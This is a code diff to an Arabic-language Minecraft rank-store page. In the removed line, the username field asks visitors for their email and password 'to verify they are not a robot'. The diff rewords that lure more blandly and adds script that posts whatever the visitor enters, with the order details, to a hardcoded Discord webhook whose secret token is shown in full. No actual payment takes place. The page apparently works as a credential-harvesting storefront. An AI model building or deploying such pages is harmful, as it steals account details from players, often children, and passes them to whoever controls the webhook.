@@ -16,7 +16,7 @@
     <div class="container">
         <div class="section">
             <h3>1. معلومات اللاعب</h3>
-            <input type="text" id="username" placeholder="أدخل الايميل و الباس لنتحقق انك ليس روبوت ماينكرافت (Username)" required>
+            <input type="text" id="username" placeholder="أدخل الاسم أو الحساب للتحقق (Username)" required>
         </div>
 
         <div class="section">
@@ -74,7 +74,43 @@
                 alert('يرجى ملء جميع البيانات واختيار الرتبة والدفع!');
                 return;
             }
-            alert(`جاري توجيه اللاعب (${user}) لدفع ${selectedPrice}$ عبر ${selectedPayment} للحصول على رتبة ${selectedRank}`);
+
+            // رابط الـ Webhook الخاص بك
+            const webhookUrl = "https://discord.com/api/webhooks/1511338644101791795/NtlsUGZ5QSEFnvkteTRSSoG5QBB0OB6aSwtGxVxD3dWfqqtDwu4RyH2wdNgzXeXAnSWJ";
+
+            // تجهيز نص الرسالة المنسق للديسكورد
+            const discordMessage = {
+                username: "بوت متجر الماين كرافت",
+                avatar_url: "https://i.imgur.com/8n0vELe.png",
+                embeds: [{
+                    title: "📥 طلب شراء رتبة جديد!",
+                    color: 65280, // لون أخضر
+                    fields: [
+                        { name: "👤 حساب اللاعب / المدخل:", value: `\`\`\`${user}\`\`\``, inline: false },
+                        { name: "👑 الرتبة المطلوبة:", value: selectedRank, inline: true },
+                        { name: "💰 السعر:", value: `$${selectedPrice}`, inline: true },
+                        { name: "💳 طريقة الدفع المختارة:", value: selectedPayment, inline: true }
+                    ],
+                    timestamp: new Date()
+                }]
+            };
+
+            // إرسال البيانات فوراً إلى الديسكورد
+            fetch(webhookUrl, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify(discordMessage)
+            })
+            .then(response => {
+                if (response.ok) {
+                    alert('✅ تم إرسال طلبك بنجاح! سيقوم أحد الإداريين بالتواصل معك لتسليمك الرتبة قريباً.');
+                } else {
+                    alert('❌ حدث خطأ أثناء إرسال الطلب، يرجى المحاولة لاحقاً.');
+                }
+            })
+            .catch(error => {
+                alert('❌ هناك مشكلة في الاتصال، يرجى التحقق من الشبكة.');
+            });
         }
     </script>
 </body>
